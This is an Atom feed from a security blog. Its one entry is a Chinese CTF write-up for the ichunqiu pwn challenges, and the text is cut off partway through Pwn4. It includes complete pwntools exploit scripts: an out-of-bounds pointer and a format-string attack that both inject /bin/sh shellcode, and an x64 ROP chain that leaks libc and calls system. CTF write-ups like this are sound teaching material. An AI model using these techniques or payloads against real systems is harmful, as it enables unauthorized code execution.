<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Chu&#39;s BLoG</title>
  <subtitle>Talk is cheap, show me the shell.</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://sh3ll.me/"/>
  <updated>2016-07-16T09:12:50.038Z</updated>
  <id>http://sh3ll.me/</id>
  
  <author>
    <name>Chu</name>
    <email>root@sh3ll.me</email>
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ichunqiu tenCentAp - Pwn</title>
    <link href="http://sh3ll.me/2016/07/04/ichunqiu-tenCentAp/"/>
    <id>http://sh3ll.me/2016/07/04/ichunqiu-tenCentAp/</id>
    <published>2016-07-04T04:56:24.000Z</published>
    <updated>2016-07-16T09:12:50.038Z</updated>
    
    <content type="html">&lt;p&gt;第一次自己做 Pwn，真刺激。bin 和 idb：&lt;a href=&quot;/images/2016/07/04/ichunqiu.7z&quot;&gt;http://sh3ll.me/images/2016/07/04/ichunqiu.7z&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;Pwn1&quot;&gt;&lt;a href=&quot;#Pwn1&quot; class=&quot;headerlink&quot; title=&quot;Pwn1&quot;&gt;&lt;/a&gt;Pwn1&lt;/h2&gt;&lt;p&gt;在输入操作下标时没有检测是否越界，通过数组越界读获取获取伪造的函数指针执行 shellcode。&lt;br&gt;&lt;img src=&quot;/images/2016/07/04/ichunqiu-1.png&quot; alt=&quot;图 1&quot;&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;br&gt;&lt;img src=&quot;/images/2016/07/04/ichunqiu-2.png&quot; alt=&quot;图 2&quot;&gt;&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;from pwn import *&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;# io = process(&amp;quot;./tc1&amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;io = remote(&amp;quot;106.75.9.11&amp;quot;, 20000)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;io.recvuntil(&amp;quot;4. Divide&amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;io.sendline(&amp;quot;29&amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;io.recvuntil(&amp;quot;[123 110]&amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload = p32(0x804a0a4) + &amp;quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;io.sendline(payload)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;io.interactive()&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&quot;Pwn2&quot;&gt;&lt;a href=&quot;#Pwn2&quot; class=&quot;headerlink&quot; title=&quot;Pwn2&quot;&gt;&lt;/a&gt;Pwn2&lt;/h2&gt;&lt;p&gt;格式化字符串漏洞。有几个点，开启了 ASLR，所有首先需要泄露出栈的地址；默认读取 16 字节的输入，对于 payload 是不够的，所以首先需要改写掉这个 16；程序设置了 alarm，如果直接重写返回地址的 4 个字节会超时退出，我的办法是分两次写，每次写两个字节；程序是个死循环，所以即使重写了返回地址默认也是无法去执行的，需要改写掉循环标识符使其跳出。&lt;br&gt;&lt;img src=&quot;/images/2016/07/04/ichunqiu-3.png&quot; alt=&quot;图 3&quot;&gt;&lt;br&gt;&lt;img src=&quot;/images/2016/07/04/ichunqiu-4.png&quot; alt=&quot;图 4&quot;&gt;&lt;br&gt;&lt;img src=&quot;/images/2016/07/04/ichunqiu-5.png&quot; alt=&quot;图 5&quot;&gt;&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;36&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;37&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;38&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;39&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;40&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;41&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;42&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;43&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;44&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;45&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;46&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;47&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;from pwn import *&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;# io = process(&amp;quot;./echo-200&amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;io = remote(&amp;quot;106.75.9.11&amp;quot;, 20001)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;# leak&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;io.recv()&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;io.sendline(&amp;quot;%d%d%d%d %p&amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;limit_addr = int(io.recvline().strip().split()[1], 16) - 0xc&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;while_loop_sign = limit_addr + 0x8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ret = limit_addr + 0x21c&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;shellcode_addr = limit_addr + 0x10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;log.success(&amp;quot;limit addr =&amp;gt; &amp;#123;&amp;#125;&amp;quot;.format(hex(limit_addr)))&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;log.success(&amp;quot;while loop sign =&amp;gt; &amp;#123;&amp;#125;&amp;quot;.format(hex(while_loop_sign)))&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;log.success(&amp;quot;ret =&amp;gt; &amp;#123;&amp;#125;&amp;quot;.format(hex(ret)))&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;log.success(&amp;quot;shellcode addr =&amp;gt; &amp;#123;&amp;#125;&amp;quot;.format(hex(shellcode_addr)))&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;# overwrite limit&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;io.recv()&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload = p32(limit_addr) + &amp;quot;%600d %7$n&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;io.sendline(payload)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;# overwrite ret&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;io.recv()&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload = p32(ret)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += &amp;quot;%&amp;#123;&amp;#125;d %7$n&amp;quot;.format(u16(p32(shellcode_addr)[:2]) - len(payload) - 1)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;io.sendline(payload)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;io.recv()&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload = p32(ret + 0x2)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += &amp;quot;%&amp;#123;&amp;#125;d %7$n&amp;quot;.format(u16(p32(shellcode_addr)[2:]) - len(payload) - 1)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;io.sendline(payload)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;# overwrite while loop sign and write shellcode&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;io.recv()&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload = p32(while_loop_sign)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += &amp;quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += &amp;quot;%d %7$n&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;# gdb.attach(io, &amp;quot;b * 0x08048FB6\nc&amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;io.sendline(payload)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;io.interactive()&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&quot;Pwn3&quot;&gt;&lt;a href=&quot;#Pwn3&quot; class=&quot;headerlink&quot; title=&quot;Pwn3&quot;&gt;&lt;/a&gt;Pwn3&lt;/h2&gt;&lt;p&gt;栈溢出，考点可能是 x64 ROP？机器是 CentOS 的，libc database 中没有找到相应的 libc，直接用的 pwntools 的 leak 泄露出 system 的偏移地址。其实这个完全可以不用泄露的，需要的技术是 return to dl_resolve，可是我还不懂，这两天要去学习下：）&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;36&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;37&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;38&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;39&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;40&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;41&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;42&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;43&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;44&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;45&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;46&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;47&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;48&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;49&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;50&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;51&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;52&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;53&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;54&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;55&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;56&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;57&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;58&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;59&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;60&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;61&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;62&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;63&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;64&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;65&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;66&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;67&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;68&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;69&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;70&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;71&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;72&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;73&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;74&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;75&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;76&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;77&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;78&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;79&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;80&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;81&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;82&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;83&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;84&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;85&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;86&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;87&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;88&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;89&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;90&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;91&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;92&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;93&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;94&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;95&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;leak.py&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;----------&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;from pwn import *&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;qwb3 = ELF(&amp;quot;./qwb3&amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;# io = process(&amp;quot;./qwb3&amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;io = remote(&amp;quot;106.75.8.230&amp;quot;, 19286)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;offset = 0x48&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;pop_rdi_ret = 0x0000000000400633&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;pop_rsi_ret = 0x0000000000400631&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;# leak&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;def leak(address):&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	print &amp;quot;leak &amp;#123;&amp;#125;&amp;quot;.format(hex(address))&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	payload = &amp;quot;A&amp;quot; * offset&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	payload += p64(pop_rdi_ret)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	payload += p64(1)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	payload += p64(pop_rsi_ret)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	payload += p64(address)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	payload += &amp;quot;A&amp;quot; * 8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	payload += p64(qwb3.plt.get(&amp;quot;write&amp;quot;))&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	payload += p64(qwb3.symbols.get(&amp;quot;vulnerable_function&amp;quot;))&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	io.sendline(payload)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	# read_addr = u64(io.recv(8))&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	ret = io.recv(8)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	io.recv()&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	return ret&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;io.recvuntil(&amp;quot;pwn pwn pwn \n&amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;de = DynELF(leak, elf=ELF(&amp;quot;./qwb3&amp;quot;))&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;system_addr = de.lookup(&amp;quot;system&amp;quot;, &amp;quot;libc&amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;write_addr = de.lookup(&amp;quot;write&amp;quot;, &amp;quot;libc&amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;print hex(system_addr)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;print hex(write_addr)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;print hex(write_addr - system_addr)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;exp.py&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;----------&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;from pwn import *&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;qwb3 = ELF(&amp;quot;./qwb3&amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;# io = process(&amp;quot;./qwb3&amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;io = remote(&amp;quot;106.75.8.230&amp;quot;, 19286)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;offset = 0x48&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;pop_rdi_ret = 0x0000000000400633&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;pop_rsi_ret = 0x0000000000400631&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;# leak&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;io.recvuntil(&amp;quot;pwn pwn pwn \n&amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload = &amp;quot;A&amp;quot; * offset&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += p64(pop_rdi_ret)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += p64(1)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += p64(pop_rsi_ret)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += p64(qwb3.got.get(&amp;quot;write&amp;quot;))&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += &amp;quot;A&amp;quot; * 8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += p64(qwb3.plt.get(&amp;quot;write&amp;quot;))&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += p64(qwb3.symbols.get(&amp;quot;vulnerable_function&amp;quot;))&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;io.sendline(payload)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;write_addr = u64(io.recv(8))&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;log.success(&amp;quot;write =&amp;gt; &amp;#123;&amp;#125;&amp;quot;.format(hex(write_addr)))&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;system_addr = write_addr - 0x9cc20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;log.success(&amp;quot;system =&amp;gt; &amp;#123;&amp;#125;&amp;quot;.format(hex(system_addr)))&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;# write /bin/sh&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;io.recv()&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload = &amp;quot;A&amp;quot; * offset&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += p64(pop_rdi_ret)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += p64(0)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += p64(pop_rsi_ret)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += p64(0x0000000000601048)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += &amp;quot;A&amp;quot; * 8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += p64(qwb3.plt.get(&amp;quot;read&amp;quot;))&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += p64(qwb3.symbols.get(&amp;quot;vulnerable_function&amp;quot;))&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;# gdb.attach(io, &amp;quot;b * vulnerable_function+31\nc&amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;io.sendline(payload)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;sleep(1)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;io.sendline(&amp;quot;/bin/sh\x00&amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;# system&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload = &amp;quot;A&amp;quot; * offset&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += p64(pop_rdi_ret)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += p64(0x0000000000601048)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;payload += p64(system_addr)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;io.sendline(payload)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;io.interactive()&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&quot;Pwn4&quot;&gt;&lt;a href=&quot;#Pwn4&quot; class=&quot;headerlink&quot; title=&quot;Pwn4&quot;&gt;&lt;/a&gt;Pwn4&lt;/h2&gt;&lt;p&gt;就是个一字节的 leak，这道题我觉得难度还不如 Pwn1…&lt;br&gt;&lt;img src=&quot;/images/2016/07/04/ichunqiu-6.png&quot; alt=&quot;图 6&quot;&gt;&lt;br&gt;name2 的 buf 空间为 40 字节，scanf 也是读入了 40 字节，也就是说可以去掉尾部的 “\00”，然后 name2 下方相邻的是 flag 的每一个字节，所以每次可以泄露一字节出来。&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div 